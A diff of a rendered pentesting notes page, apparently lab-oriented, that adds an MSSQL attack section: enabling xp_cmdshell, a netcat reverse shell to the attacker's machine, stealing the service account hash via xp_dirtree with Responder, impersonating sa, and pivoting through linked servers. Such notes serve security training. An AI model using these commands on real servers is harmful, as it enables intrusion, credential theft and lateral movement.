@@ -7527,11 +7527,53 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#executing-cmd-shell-in-a-sql-command-line" class="md-nav__link">
     <span class="md-ellipsis">
       Executing cmd shell in a SQL command line
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#capture-mssql-service-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capture MSSQL Service Hash
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#impersonate-existing-users-with-mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Impersonate Existing Users with MSSQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#communicate-with-other-databases-with-mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Communicate with Other Databases with MSSQL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -11517,11 +11559,53 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#executing-cmd-shell-in-a-sql-command-line" class="md-nav__link">
     <span class="md-ellipsis">
       Executing cmd shell in a SQL command line
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#capture-mssql-service-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capture MSSQL Service Hash
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#impersonate-existing-users-with-mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Impersonate Existing Users with MSSQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#communicate-with-other-databases-with-mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Communicate with Other Databases with MSSQL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -11582,7 +11666,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div>
 <h4 id="connecting-with-mssqlclientpy">Connecting with Mssqlclient.py</h4>
 <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span>Administrator@10.129.201.248<span class="w"> </span>-windows-auth<span class="w">  </span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span>Administrator@<span class="nv">$ip</span><span class="w"> </span>-windows-auth<span class="w">  </span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># With python3 mssqlclient.py help you can see more options.</span>
 </span></code></pre></div>
 <h2 id="basic-mssql-commands">Basic mssql commands</h2>
@@ -11607,10 +11691,14 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a># And to make sure: 
 </span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>SELECT is_srvrolemember(‘sysadmin’); 
 </span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a># If your user is admin, it will return 1.
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a># Read Local Files in MSSQL
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents
 </span></code></pre></div>
-<h2 id="executing-cmd-shell-in-a-sql-command-line">Executing cmd shell in a SQL command line</h2>
+<h2 id="attacks">Attacks</h2>
+<h3 id="executing-cmd-shell-in-a-sql-command-line">Executing cmd shell in a SQL command line</h3>
 <p>Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command <strong>xp_cmdshell</strong>, that will allow us to use the SQL command line as a CLI. </p>
-<p>Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default. But we can use sp_configure or Policy Based Management to enable it. </p>
+<p>Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default.  <code>xp_cmdshell</code> can be enabled and disabled by using the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration">Policy-Based Management</a> or by executing <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option">sp_configure</a></p>
 <p><strong>sp_configure</strong> displays or changes global configuration settings for the current settings. This is how you may take advantage of it:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># To allow advanced options to be changed.   
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>EXECUTE sp_configure &#39;show advanced options&#39;, 1;  
@@ -11624,6 +11712,9 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a># To update the currently configured value for this feature.  
 </span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>RECONFIGURE;  
 </span></code></pre></div>
+<blockquote>
+<p>Note:  The Windows process spawned by <code>xp_cmdshell</code> has the same security rights as the SQL Server service account</p>
+</blockquote>
 <p>Now we can use the msSQL terminal to execute commands:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a># This will return the .exe files existing in the current directory
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>EXEC xp_cmdshell &#39;dir *.exe&#39;;
@@ -11638,6 +11729,69 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443&quot;;
 </span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a># You could also upload winPEAS and run it from this powershell command line
 </span></code></pre></div>
+<p>There are other methods to get command execution, such as adding <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server">extended stored procedures</a>, <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">CLR Assemblies</a>, <a href="https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15">SQL Server Agent Jobs</a>, and <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql">external scripts</a>.</p>
+<h3 id="capture-mssql-service-hash">Capture MSSQL Service Hash</h3>
+<p>We can steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.</p>
+<p>When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p>
+<p><strong>1.</strong> First, start <a href="../responder/">Responder</a> or <a href="../smbserver/">smbserver from impacket</a>.</p>
+<p><strong>2.</strong> Run:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># For XP_DIRTREE Hash Stealing
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>EXEC master..xp_dirtree &#39;\\$ip\share\&#39;
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a># For XP_SUBDIRS Hash Stealing
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>EXEC master..xp_subdirs &#39;\\$ip\share\
+</span></code></pre></div>
+<p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p>
+<p><strong>3.</strong> XP_SUBDIRS Hash Stealing with Responder</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="go">sudo responder -I tun0</span>
+</span></code></pre></div>
+<p><strong>4.</strong> XP_SUBDIRS Hash Stealing with impacket</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="go">sudo impacket-smbserver share ./ -smb2support</span>
+</span></code></pre></div>
+<h3 id="impersonate-existing-users-with-mssql">Impersonate Existing Users with MSSQL</h3>
+<p>SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends:</p>
+<p>Impersonating sysadmin</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># Identify Users that We Can Impersonate
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;;
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a># Verify if our current user has the sysadmin role:
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>SELECT SYSTEM_USER;
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>#  value 0 indicates no sysadmin role, value 1 is sysadmin role
+</span></code></pre></div>
+<p>Impersonating sa user</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>USE master;
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>EXECUTE AS LOGIN = &#39;sa&#39;;
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>SELECT SYSTEM_USER;
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);
+</span></code></pre></div>
+<blockquote>
+<p>It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.</p>
+</blockquote>
+<p>To revert the operation and return to our previous user</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>REVERT;
+</span></code></pre></div>
+<h3 id="communicate-with-other-databases-with-mssql">Communicate with Other Databases with MSSQL</h3>
+<p><code>MSSQL</code> has a configuration option called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine">linked servers</a>. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p>
+<p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># Identify linked Servers in MSSQL
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>SELECT srvname, isremote FROM sysservers;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>srvname                             isremote
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>----------------------------------- --------
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>DESKTOP-MFERMN4\SQLEXPRESS          1
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>10.0.0.12\SQLEXPRESS                0
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a># isremote, where 1 means is a remote server, and 0 is a linked server. 
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>#  Identify the user used for the connection and its privileges:
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS];
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a># The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
+</span></code></pre></div>
+<blockquote>
+<p>If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p>
+</blockquote>
 <h2 id="sources-and-resources">Sources and resources</h2>
 <ul>
 <li><a href="https://github.com/vinsworldcom/NetCat64/releases">nc64.exe</a>.</li>
@@ -11649,7 +11803,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-11-28T21:35:42+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-11-28</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-12-04T21:50:34+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-12-04</span></small></br>
 
 
     <small>Created: January 6, 2023 21:39:12</small>
